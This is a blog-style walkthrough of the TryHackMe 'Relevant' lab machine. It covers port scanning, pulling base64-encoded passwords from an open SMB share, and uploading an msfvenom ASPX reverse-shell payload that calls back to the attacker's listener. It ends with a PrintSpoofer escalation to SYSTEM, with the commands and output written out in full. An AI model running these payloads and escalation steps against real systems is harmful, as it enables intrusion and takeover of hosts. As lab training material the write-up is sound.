---
layout: post
title: TryHackMe - Relevant
---

Room: [Relevant](https://tryhackme.com/room/relevant)

Note: I mapped the target IP to relevant.thm in my /etc/hosts file. 

## Enumeration

```
root@ip-10-10-196-226:~# sudo nmap -p- -T4 relevant.thm

Starting Nmap 7.60 ( https://nmap.org ) at 2021-03-03 21:31 GMT
Verbosity Increased to 1.
SYN Stealth Scan Timing: About 79.71% done; ETC: 21:56 (0:05:03 remaining)
Verbosity Increased to 2.
Discovered open port 49667/tcp on 10.10.126.174
Discovered open port 49668/tcp on 10.10.126.174
SYN Stealth Scan Timing: About 84.80% done; ETC: 21:56 (0:03:46 remaining)
SYN Stealth Scan Timing: About 90.04% done; ETC: 21:56 (0:02:28 remaining)
SYN Stealth Scan Timing: About 95.04% done; ETC: 21:56 (0:01:13 remaining)
Completed SYN Stealth Scan at 21:56, 1477.59s elapsed (65535 total ports)
Nmap scan report for relevant.thm (10.10.126.174)
Host is up (0.00044s latency).
Scanned at 2021-03-03 21:31:56 GMT for 1478s
Not shown: 65525 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
49663/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
MAC Address: 02:96:7B:46:55:13 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1477.99 seconds
           Raw packets sent: 197750 (8.701MB) | Rcvd: 1639 (106.015KB)

root@ip-10-10-196-226:~# sudo nmap -p80,135,139,445,3389,5985,49663,49667,49668,49670 -sV -sC -T4 relevant.thm

Starting Nmap 7.60 ( https://nmap.org ) at 2021-03-03 21:58 GMT
Nmap scan report for relevant.thm (10.10.126.174)
Host is up (0.00042s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2021-03-02T21:30:06
|_Not valid after:  2021-09-01T21:30:06
|_ssl-date: 2021-03-03T21:59:51+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49663/tcp open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 02:96:7B:46:55:13 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: RELEVANT, NetBIOS user: <unknown>, NetBIOS MAC: 02:96:7b:46:55:13 (unknown)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT 
|   Workgroup: WORKGROUP 
|_  System time: 2021-03-03T13:59:50-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-03 21:59:50
|_  start_date: 2021-03-03 21:30:07

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.95 seconds
```

```
root@ip-10-10-196-226:~# smbclient -L relevant.thm
WARNING: The "syslog" option is deprecated
Enter WORKGROUP
oot's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.126.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
root@ip-10-10-196-226:~# smbclient \\relevant.thm\nt4wrksv
WARNING: The "syslog" option is deprecated
Enter WORKGROUP
oot's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 22:46:04 2020
  ..                                  D        0  Sat Jul 25 22:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 16:15:33 2020

		7735807 blocks of size 4096. 4935878 blocks available

smb: \> get passwords.txt 
getting file \passwords.txt of size 98 as passwords.txt (13.7 KiloBytes/sec) (average 13.7 KiloBytes/sec)
```

The password file contained two base64 encoded strings.
```
Qm9iIC0gIVBAJCRXMHJEITEyMw==
Bob - !P@$$W0rD!123

QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
Bill - Juw4nnaM4n420696969!$$$
```

To validate the credentials I used impacket's psexec.py.

```
root@ip-10-10-196-226:~# psexec.py Bill:'Juw4nnaM4n420696969!$$$'@relevant.thm
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[-] Authenticated as Guest. Aborting
root@ip-10-10-196-226:~# psexec.py Bob:'!P@$$W0rD!123'@relevant.thm
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on relevant.thm.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[*] Found writable share nt4wrksv
[*] Uploading file EdxTArZv.exe
[*] Opening SVCManager on relevant.thm.....
[-] Error opening SVCManager on relevant.thm.....
[-] Error performing the installation, cleaning up: Unable to open SVCManager
```
I then verified by uploading a reverse shell to the share as Bob.
```
root@ip-10-10-196-226:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.196.226 LPORT=443 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes

root@ip-10-10-196-226:~# smbclient \\relevant.thm\nt4wrksv -U Bob
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\Bob's password: 
smb: \> put shell.exe
putting file shell.exe as \shell.exe (36034.4 kb/s) (average 18018.6 kb/s)
```

## Gaining Access

I looked at the http services running and after some checks, found http://relevant.thm:49663/nt4wrksv/passwords.txt contained the password file I had found on the SMB share. However, shell.exe did not run. After some research, I determined I needed to use an ASPX file so that it would run on IIS.

```
# Make Payload
root@ip-10-10-196-226:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.196.226 LPORT=443 -f aspx -o shell.aspx

# Upload
root@ip-10-10-196-226:~# smbclient \\relevant.thm\nt4wrksv -U Bob
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\Bob's password: 
Try "help" to get a list of possible commands.
smb: \> put shell.aspx 
putting file shell.aspx as \shell.aspx (20.1 kb/s) (average 20.1 kb/s)

# Start Listener
root@ip-10-10-196-226:~# nc -nlvp 443

# Trigger Reverse Shell
root@ip-10-10-196-226:~# curl http://relevant.thm:49663/nt4wrksv/shell.aspx

## The Shell
root@ip-10-10-196-226:~# nc -nlvp 443
Listening on [0.0.0.0] (family 0, port 443)
Connection from 10.10.126.174 49884 received!
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

`SeImpersonatePrivilege` seems promising. I checked [Priv2Admin](https://github.com/gtworek/Priv2Admin) and found that tools from the Potato family could be used to escalate when `SeImpersonate` was on the list of user privileges. I tried several different Potato executables, checked that port 5985 was being used (preventing RogueWinRM as an option), and eventually found a path with PrintSpoofer.exe.

```
# AttackBox
root@ip-10-10-196-226:~# smbclient \\relevant.thm\nt4wrksv -U Bob
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\Bob's password: 
Try "help" to get a list of possible commands.
smb: \> put PrintSpoofer.exe 
putting file PrintSpoofer.exe as \PrintSpoofer.exe (60.2 kb/s) (average 60.2 kb/s)

# Victim
c:\inetpub\wwwroot
t4wrksv>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening ...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32>whoami
whoami
nt authority\system
```

The user and root flags were found on Bob's desktop and the Administrator's desktop, respectively.
